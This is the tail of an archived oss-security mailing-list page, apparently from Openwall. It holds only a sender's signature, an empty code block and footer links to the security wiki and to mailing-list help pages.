
Alexander

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).


